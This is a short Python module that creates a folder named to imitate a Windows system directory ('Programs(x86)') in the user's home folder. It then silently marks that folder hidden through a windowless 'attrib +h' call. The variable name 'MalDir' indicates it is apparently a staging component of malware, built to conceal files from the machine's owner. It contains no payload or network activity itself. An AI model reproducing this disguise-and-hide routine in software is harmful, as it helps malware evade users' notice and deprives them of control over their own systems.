def create():
    global mdir
    import os
    import subprocess
    MalDir = "Programs(x86)"
    udir = os.path.expanduser("~")
    mdir = (f"{udir}\\{MalDir}")
    try:
        os.mkdir(mdir)
    except FileExistsError:
        pass
    subprocess.run(f"attrib +h {mdir}",shell=True,creationflags=subprocess.CREATE_NO_WINDOW)
def Get():
    return mdir